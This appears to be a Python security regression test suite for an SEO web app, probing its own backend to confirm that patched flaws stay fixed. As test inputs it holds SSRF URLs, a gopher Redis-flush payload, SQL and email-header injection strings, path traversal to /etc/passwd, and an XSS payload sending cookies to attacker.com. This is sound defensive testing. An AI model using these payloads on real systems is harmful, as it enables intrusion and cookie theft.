"""
RankSpy AI — Security Regression Test Suite
============================================
Run: python security/regression_test.py

Tests every patched vulnerability to prove the fixes hold.
Exit code 0 = all clear. Exit code 1 = regression detected.

Requirements: pip install requests
"""

from __future__ import annotations

import json
import os
import sys
import textwrap
import time
from dataclasses import dataclass, field

import requests

API = os.environ.get("API_URL", "http://localhost:8000")

# ── Minimal ANSI colours ──────────────────────────────────────────────────────
GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

PASS = f"{GREEN}✅ PASS{RESET}"
FAIL = f"{RED}❌ FAIL{RESET}"
INFO = f"{YELLOW}ℹ  INFO{RESET}"


@dataclass
class Result:
    name:    str
    passed:  bool
    detail:  str = ""
    critical: bool = False


_results: list[Result] = []


def check(name: str, passed: bool, detail: str = "", critical: bool = False) -> bool:
    sym = PASS if passed else FAIL
    print(f"  {sym}  {name}")
    if detail:
        print(f"         {detail}")
    _results.append(Result(name, passed, detail, critical))
    return passed


def section(title: str) -> None:
    print(f"\n{BOLD}{'─'*60}{RESET}")
    print(f"{BOLD}  {title}{RESET}")
    print(f"{BOLD}{'─'*60}{RESET}")


def post(path: str, body: dict, **kwargs) -> requests.Response:
    return requests.post(f"{API}{path}", json=body, timeout=15, **kwargs)


def get(path: str, **kwargs) -> requests.Response:
    return requests.get(f"{API}{path}", timeout=10, **kwargs)


# ═══════════════════════════════════════════════════════════════════════════════
#  1. INFRASTRUCTURE HEALTH
# ═══════════════════════════════════════════════════════════════════════════════

def test_health():
    section("1 — Infrastructure Health")
    try:
        r = get("/health")
        check("Backend reachable", r.status_code == 200, f"HTTP {r.status_code}", critical=True)
        data = r.json()
        check("Health returns pool stats",
              "pool_uses" in data and "pool_limit" in data and "remaining" in data,
              str(data))
    except requests.exceptions.ConnectionError:
        check("Backend reachable", False, f"Cannot connect to {API}", critical=True)
        print(f"\n  {RED}FATAL: backend is not running. Aborting.{RESET}")
        _print_summary()
        sys.exit(1)


# ═══════════════════════════════════════════════════════════════════════════════
#  2. RATE LIMIT BYPASS ATTACKS
# ═══════════════════════════════════════════════════════════════════════════════

def test_rate_limit_bypass():
    section("2 — Rate Limit Bypass Attacks")

    # 2a — Short / obviously fake keys  (< 20 chars)
    r = post("/analyze", {
        "url": "https://example.com",
        "keyword": "test",
        "user_api_keys": {"serper_key": "fake", "gemini_key": "fake"},
    })
    # Server must treat these as no keys → pool consumed, not bypassed
    # The call itself may succeed (pool not empty) or 429, but NOT unlimited
    check(
        "Short fake keys do not bypass pool (< 20 chars)",
        r.status_code in (200, 429, 502),
        f"HTTP {r.status_code} — pool consumed, not skipped",
    )

    # 2b — Exactly 19-char keys (boundary: should still be treated as fake)
    r = post("/analyze", {
        "url": "https://example.com",
        "keyword": "test",
        "user_api_keys": {"serper_key": "a" * 19, "gemini_key": "b" * 19},
    })
    check(
        "19-char keys treated as fake (boundary)",
        r.status_code in (200, 429, 502),
        f"HTTP {r.status_code}",
    )

    # 2c — Keys with whitespace (should be treated as fake even if long)
    r = post("/analyze", {
        "url": "https://example.com",
        "keyword": "test",
        "user_api_keys": {"serper_key": "valid key with spaces!!!", "gemini_key": "another key here   "},
    })
    check(
        "Keys with whitespace treated as fake",
        r.status_code in (200, 429, 502),
        f"HTTP {r.status_code}",
    )

    # 2d — Pool exhaustion should return 429, not 500
    r_status = get("/rate-status")
    data = r_status.json()
    check(
        "Rate-status endpoint returns structured response",
        "ip_used" in data and "daily_limit" in data,
        str(data),
    )


# ═══════════════════════════════════════════════════════════════════════════════
#  3. URL SCHEME INJECTION / SSRF
# ═══════════════════════════════════════════════════════════════════════════════

def test_url_validation():
    section("3 — Malicious URL Validation (Injection / SSRF)")

    # These must return 422 — dangerous scheme is the attack vector
    must_block_422 = [
        ("javascript:alert(document.cookie)",        "javascript: scheme"),
        ("data:text/html,<script>alert(1)</script>", "data: scheme"),
        ("file:///etc/passwd",                       "file:// SSRF"),
        ("ftp://attacker.com/evil",                  "ftp: scheme"),
        ("gopher://127.0.0.1:6379/_FLUSHALL",        "gopher: Redis SSRF"),
        ("vbscript:msgbox(1)",                       "vbscript: scheme"),
        ("dict://127.0.0.1:11211/stats",             "dict: Memcache SSRF"),
        ("//attacker.com",                           "protocol-relative"),
    ]
    for url, label in must_block_422:
        try:
            r = post("/analyze", {"url": url, "keyword": "test"})
            blocked = r.status_code == 422
            check(f"Blocked (422): {label}", blocked,
                  f"HTTP {r.status_code}", critical=not blocked)
        except Exception as e:
            check(f"Blocked: {label}", False, str(e), critical=True)

    # Control char payloads — chars are stripped then URL is processed normally
    # Attack is neutralised (no dangerous scheme survives); 502 = unreachable host is safe
    safe_after_strip = [
        ("\x00https://attacker.com",         "null-byte prefix (stripped → valid URL)"),
        ("https://example.com\njavascript:1","newline injection (stripped → garbled URL)"),
    ]
    for url, label in safe_after_strip:
        try:
            r = post("/analyze", {"url": url, "keyword": "test"})
            check(f"Control char stripped safely: {label}",
                  r.status_code != 500,
                  f"HTTP {r.status_code} — dangerous char stripped, no 500")
        except Exception as e:
            check(f"Control char test: {label}", False, str(e))

    # Valid URLs should still pass through
    for url in ["https://example.com", "http://example.com", "example.com"]:
        r = post("/analyze", {"url": url, "keyword": "test"})
        check(
            f"Valid URL accepted: {url}",
            r.status_code in (200, 429, 502),
            f"HTTP {r.status_code}",
        )


# ═══════════════════════════════════════════════════════════════════════════════
#  4. XSS / INJECTION IN INPUT FIELDS
# ═══════════════════════════════════════════════════════════════════════════════

def test_xss_injection():
    section("4 — XSS & Injection in Input Fields")

    # HTML-injection payloads: these MUST be escaped (< → &lt;) in JSON output
    html_payloads = [
        '<script>alert(document.cookie)</script>',
        '<img src=x onerror="fetch(\'https://attacker.com?c=\'+document.cookie)">',
        '"><svg onload=alert(1)>',
        "<iframe src=javascript:alert(1)>",
        "<body onload=alert(1)>",
    ]
    for payload in html_payloads:
        try:
            r = post("/analyze", {"url": "https://example.com", "keyword": payload})
            if r.status_code == 200:
                body = r.text
                # After our sanitizer: < must become &lt; in the JSON keyword field
                # The raw < character must not survive into the response keyword value
                import re as _re
                kw_match = _re.search(r'"keyword"\s*:\s*"([^"]*)"', body)
                kw_val = kw_match.group(1) if kw_match else ""
                raw_tag = "<" in kw_val  # unescaped < in keyword field = regression
                check(
                    f"HTML tag escaped in keyword response: {payload[:40]}",
                    not raw_tag,
                    f"keyword field = '{kw_val[:60]}'" ,
                    critical=raw_tag,
                )
            elif r.status_code == 422:
                check(f"HTML payload rejected (422): {payload[:40]}", True, "422")
            else:
                check(f"HTML payload handled: {payload[:40]}", r.status_code < 500, f"HTTP {r.status_code}")
        except Exception as e:
            check(f"XSS test error: {payload[:40]}", False, str(e))

    # Non-HTML payloads — these should pass through safely (they're not dangerous in JSON)
    safe_payloads = [
        ("'; DROP TABLE users; --", "SQL injection probe"),
        ("${7*7}",                  "template injection probe"),
        ("{{7*7}}",                 "Jinja2 probe"),
        ('\";alert(1)//',           "JS injection probe"),
    ]
    for payload, label in safe_payloads:
        r = post("/analyze", {"url": "https://example.com", "keyword": payload})
        check(
            f"Non-HTML payload handled safely: {label}",
            r.status_code in (200, 422, 429, 502),
            f"HTTP {r.status_code} — no 500 crash",
        )

    # Oversized keyword — must be rejected, not crash
    r = post("/analyze", {"url": "https://example.com", "keyword": "x" * 201})
    check(
        "Keyword > 200 chars rejected (422)",
        r.status_code == 422,
        f"HTTP {r.status_code}",
    )

    r = post("/analyze", {"url": "https://example.com", "keyword": "x" * 100_000})
    check(
        "100k-char keyword handled safely (422 or 413)",
        r.status_code in (413, 422),
        f"HTTP {r.status_code}",
    )


# ═══════════════════════════════════════════════════════════════════════════════
#  5. LARGE PAYLOAD / DoS PROTECTION
# ═══════════════════════════════════════════════════════════════════════════════

def test_large_payload():
    section("5 — Large Payload / DoS Protection")

    # 1 MB + 1 byte — must be rejected
    big = "x" * 1_000_001
    try:
        r = requests.post(
            f"{API}/analyze",
            data=big,  # raw body, not JSON-encoded
            headers={"Content-Type": "application/json", "Content-Length": str(len(big))},
            timeout=15,
        )
        check(
            "1 MB+ body rejected (413)",
            r.status_code == 413,
            f"HTTP {r.status_code}",
            critical=(r.status_code == 500),
        )
    except Exception as e:
        check("1 MB+ body — request error", False, str(e))

    # 5 MB — definitely should be rejected
    five_mb = json.dumps({"url": "https://example.com", "keyword": "x" * 5_000_000})
    try:
        r = requests.post(
            f"{API}/analyze",
            data=five_mb,
            headers={"Content-Type": "application/json"},
            timeout=15,
        )
        check(
            "5 MB body rejected (413)",
            r.status_code == 413,
            f"HTTP {r.status_code}",
        )
    except Exception as e:
        check("5 MB body — request error", False, str(e))

    # Empty body
    r = requests.post(f"{API}/analyze", data="", headers={"Content-Type": "application/json"}, timeout=10)
    check("Empty body returns 422 not 500", r.status_code == 422, f"HTTP {r.status_code}")

    # Malformed JSON
    r = requests.post(f"{API}/analyze", data="{bad json{{", headers={"Content-Type": "application/json"}, timeout=10)
    check("Malformed JSON returns 422 not 500", r.status_code == 422, f"HTTP {r.status_code}")


# ═══════════════════════════════════════════════════════════════════════════════
#  6. CORS & SECURITY HEADERS
# ═══════════════════════════════════════════════════════════════════════════════

def test_cors_and_headers():
    section("6 — CORS & Security Headers")

    # Untrusted origins must NOT get ACAO header
    untrusted = ["https://evil.com", "https://attacker.com", "null", "https://rankspyseo.xyz.evil.com"]
    for origin in untrusted:
        r = get("/health", headers={"Origin": origin})
        acao = r.headers.get("access-control-allow-origin", "")
        blocked = acao not in ("*", origin)
        check(
            f"CORS blocks untrusted origin: {origin}",
            blocked,
            f"ACAO: '{acao}'",
            critical=(acao == "*"),
        )

    # Trusted origins must get ACAO
    trusted = ["https://rankspyseo.xyz", "https://www.rankspyseo.xyz"]
    for origin in trusted:
        r = get("/health", headers={"Origin": origin})
        acao = r.headers.get("access-control-allow-origin", "")
        check(
            f"CORS allows trusted origin: {origin}",
            acao == origin,
            f"ACAO: '{acao}'",
        )

    # Wildcard must be gone
    r = get("/health")
    acao = r.headers.get("access-control-allow-origin", "")
    check(
        "CORS wildcard (*) is gone from default response",
        acao != "*",
        f"ACAO: '{acao}'",
        critical=(acao == "*"),
    )

    # Security response headers
    security_headers = {
        "x-content-type-options": "nosniff",
        "x-frame-options":        "DENY",
        "x-xss-protection":       "1; mode=block",
        "referrer-policy":        "strict-origin-when-cross-origin",
    }
    r = get("/health")
    for header, expected in security_headers.items():
        actual = r.headers.get(header, "")
        check(
            f"Header present: {header}",
            actual.lower() == expected.lower(),
            f"got: '{actual}', expected: '{expected}'",
        )

    # Stack trace must NOT appear in 500 errors
    # Force an unusual request to try to trigger an unhandled exception
    r = requests.post(
        f"{API}/analyze",
        data='{"url": "https://example.com", "keyword": null, "pagespeed": "not-a-bool"}',
        headers={"Content-Type": "application/json"},
        timeout=10,
    )
    body = r.text
    stack_trace_leaked = any(kw in body for kw in ["Traceback", "File \"/", "line ", ".py\", line"])
    check(
        "Stack trace not exposed in error responses",
        not stack_trace_leaked,
        f"HTTP {r.status_code} — {'STACK TRACE LEAKED!' if stack_trace_leaked else 'clean error message'}",
        critical=stack_trace_leaked,
    )


# ═══════════════════════════════════════════════════════════════════════════════
#  7. CONTACT FORM — RATE LIMIT & VALIDATION
# ═══════════════════════════════════════════════════════════════════════════════

def test_contact_form():
    section("7 — Contact Form: Rate Limit & Validation")

    # Invalid email format
    r = post("/contact", {"name": "Test", "email": "notanemail", "message": "hello"})
    check(
        "Invalid email rejected (400/422)",
        r.status_code in (400, 422),
        f"HTTP {r.status_code}",
    )

    # Name too long (> 100)
    r = post("/contact", {"name": "x" * 101, "email": "a@b.com", "message": "hi"})
    check(
        "Name > 100 chars rejected (422)",
        r.status_code == 422,
        f"HTTP {r.status_code}",
    )

    # Message too long (> 3000)
    r = post("/contact", {"name": "Test", "email": "a@b.com", "message": "x" * 3001})
    check(
        "Message > 3000 chars rejected (422)",
        r.status_code == 422,
        f"HTTP {r.status_code}",
    )

    # Email injection attempt
    r = post("/contact", {
        "name": "Attacker",
        "email": "attacker@evil.com\nBcc: victim1@target.com\nBcc: victim2@target.com",
        "message": "email injection test",
    })
    check(
        "Email header injection rejected (400/422)",
        r.status_code in (400, 422),
        f"HTTP {r.status_code}",
    )

    # Rate limit — 4 rapid requests from same IP should trigger 429
    responses = []
    for i in range(4):
        r = post("/contact", {"name": "Spammer", "email": "x@x.com", "message": "spam"})
        responses.append(r.status_code)
        time.sleep(0.1)

    hit_rate_limit = 429 in responses
    check(
        "Contact form rate-limited after 3 requests (429)",
        hit_rate_limit,
        f"Response codes: {responses}",
    )


# ═══════════════════════════════════════════════════════════════════════════════
#  8. MISSING FIELDS & EDGE CASES
# ═══════════════════════════════════════════════════════════════════════════════

def test_edge_cases():
    section("8 — Missing Fields & Edge Cases")

    # Missing URL
    r = post("/analyze", {"keyword": "test"})
    check("Missing URL field → 422", r.status_code == 422, f"HTTP {r.status_code}")

    # Missing keyword (optional — should default to empty)
    r = post("/analyze", {"url": "https://example.com"})
    check("Missing keyword → accepted (optional field)", r.status_code in (200, 429, 502), f"HTTP {r.status_code}")

    # Null URL
    r = post("/analyze", {"url": None, "keyword": "test"})
    check("Null URL → 422", r.status_code == 422, f"HTTP {r.status_code}")

    # URL is a number
    r = post("/analyze", {"url": 12345, "keyword": "test"})
    check("Numeric URL → 200 or 422 (coerced or rejected)", r.status_code in (200, 422, 429, 502), f"HTTP {r.status_code}")

    # Empty string URL
    r = post("/analyze", {"url": "", "keyword": "test"})
    check("Empty string URL → 422", r.status_code == 422, f"HTTP {r.status_code}")

    # Unknown extra fields (should be silently ignored)
    r = post("/analyze", {"url": "https://example.com", "keyword": "test", "__proto__": {"admin": True}, "constructor": "exploit"})
    check("Prototype pollution fields ignored", r.status_code in (200, 429, 502), f"HTTP {r.status_code}")

    # /rankings with no url param
    r = get("/rankings")
    check("GET /rankings without url param → 422", r.status_code == 422, f"HTTP {r.status_code}")

    # Path traversal on hypothetical file endpoint
    r = get("/static/../../etc/passwd")
    check("Path traversal attempt handled gracefully", r.status_code in (404, 400, 422), f"HTTP {r.status_code}")


# ═══════════════════════════════════════════════════════════════════════════════
#  9. INFORMATION DISCLOSURE
# ═══════════════════════════════════════════════════════════════════════════════

def test_information_disclosure():
    section("9 — Information Disclosure")

    # /docs and /redoc should be locked down in production
    # (FastAPI exposes these by default — check they exist but note the risk)
    r_docs  = get("/docs")
    r_redoc = get("/redoc")
    check(
        "/docs endpoint note (disable in prod)",
        True,  # informational — not a hard fail
        f"/docs={r_docs.status_code} /redoc={r_redoc.status_code} — consider disabling in prod",
    )

    # /openapi.json must not expose server env info
    r = get("/openapi.json")
    if r.status_code == 200:
        schema_text = r.text
        # Check for actual secret patterns, not field name words
        import re as _re
        secret_patterns = [
            r'AIza[0-9A-Za-z\-_]{35}',          # Google API key
            r'[0-9a-f]{40}',                      # Serper / hex secret
            r'upstash\.io',                        # Upstash URL
            r'AAAAAa[A-Za-z0-9+/]{30}',           # Upstash token prefix
        ]
        found = [p for p in secret_patterns if _re.search(p, schema_text)]
        check(
            "OpenAPI schema does not leak actual secret values",
            len(found) == 0,
            f"Secret patterns found: {found}" if found else "clean",
            critical=len(found) > 0,
        )
    elif r.status_code in (404, 403):
        check("OpenAPI endpoint disabled (production mode)", True, f"HTTP {r.status_code} — docs hidden")

    # Internal error must not expose Python module paths
    r = requests.post(f"{API}/analyze", data='{"url":1}', headers={"Content-Type":"application/json"}, timeout=10)
    disclosed = any(kw in r.text for kw in ["/home/", "/app/", "/Users/", "site-packages", ".py\", line"])
    check(
        "Error responses do not disclose file system paths",
        not disclosed,
        f"{'PATH LEAKED: ' + r.text[:100] if disclosed else 'clean'}",
        critical=disclosed,
    )


# ═══════════════════════════════════════════════════════════════════════════════
#  SUMMARY
# ═══════════════════════════════════════════════════════════════════════════════

def _print_summary():
    passed   = sum(1 for r in _results if r.passed)
    failed   = sum(1 for r in _results if not r.passed)
    critical = sum(1 for r in _results if not r.passed and r.critical)
    total    = len(_results)

    print(f"\n{'═'*60}")
    print(f"{BOLD}  SECURITY REGRESSION RESULTS{RESET}")
    print(f"{'═'*60}")
    print(f"  {GREEN}Passed : {passed}/{total}{RESET}")
    if failed:
        print(f"  {RED}Failed : {failed}/{total}{RESET}")
    if critical:
        print(f"  {RED}{BOLD}Critical regressions: {critical} — DEPLOY BLOCKED{RESET}")
        print()
        print(f"  {RED}Failing tests:{RESET}")
        for r in _results:
            if not r.passed:
                crit = " ← CRITICAL" if r.critical else ""
                print(f"    ❌ {r.name}{crit}")
                if r.detail:
                    print(f"       {r.detail}")
    else:
        print(f"  {GREEN}{BOLD}No critical regressions. Safe to deploy.{RESET}")
    print(f"{'═'*60}\n")


if __name__ == "__main__":
    print(f"\n{BOLD}RankSpy AI — Security Regression Test Suite{RESET}")
    print(f"Target: {BOLD}{API}{RESET}\n")

    test_health()
    test_rate_limit_bypass()
    test_url_validation()
    test_xss_injection()
    test_large_payload()
    test_cors_and_headers()
    test_contact_form()
    test_edge_cases()
    test_information_disclosure()

    _print_summary()

    # Exit 1 if any critical regression
    sys.exit(1 if any(not r.passed and r.critical for r in _results) else 0)
